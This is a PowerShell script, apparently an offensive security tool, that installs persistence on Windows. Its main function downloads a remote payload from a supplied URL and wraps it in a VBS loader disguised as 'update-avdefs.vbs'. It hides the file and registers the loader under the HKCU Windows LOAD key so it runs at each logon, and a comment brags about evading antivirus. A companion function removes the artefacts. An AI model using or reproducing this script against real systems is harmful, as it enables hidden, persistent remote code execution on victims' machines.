function Add-Persistence()
{
	param
	(
		[parameter(Mandatory=$true)]
		[string]
		$payloadurl
	)
		$tmpdir = $env:APPDATA
	
	$payloadvbsloaderpath = "$tmpdir\update-avdefs.vbs"

	$admin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
	if ($admin -eq $true)
		{ Write-Host "[+] User is a local administrator!" }
	else
		{ Write-Host "[-] User is not a local administrator." }

  Write-Host "[+] Downloading payload $payloadurl"
	$payload = (New-Object Net.WebClient).DownloadString($payloadurl)
	
	$payloadlength = $payload.Length
	if ($payloadlength -gt 0) 
		{ Write-Host "[+] Payload length: $payloadlength bytes" }
	else
	{ 
		Write-Host "[!] Payload length: 0 characters. Is the web server up?"
		return
	}
	
	Write-Host "[+] Creating VBS loader."
	$vbs = "Set oShell = CreateObject( ""WScript.Shell"" )`r`n"
	$vbs += "ps = ""$payload""`r`n"
	$vbs += "oShell.run(ps),0,true"
	$vbs | Out-File $payloadvbsloaderpath -Force
	
	# Mark the file as hidden.
	Write-Host "[+] Marking $payloadvbsloaderpath as Hidden."
	$fileObj = get-item $payloadvbsloaderpath -Force
	$fileObj.Attributes="Hidden"
	
	# Set the LOAD key. Haven't been caught by AV yet. ;-)
	Write-Host "[+] Updating registry with a LOAD key"
	Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name LOAD -Value $payloadvbsloaderpath

	Write-Host "[+] Done!"
}

function Remove-Persistence()
{
	$appdir = $env:APPDATA
	$payload = "$appdir\update-avdefs.vbs"
	
	if (Test-Path $payload)
	{
		Remove-Item -Path $payload -Force
		Write-Host "[+] Found and removed $payload."
	}
	else 
		{ Write-Host "[-] $payload not found." }
		
	$reg = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
	if ($reg.LOAD -eq $payload)
	{
		Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name LOAD
		Write-Host "[+] Found and removed LOAD registry key."
	}
	else
		{ Write-Host "[-] LOAD registry key not found." }
	
	Write-Host "[+] Done."
}
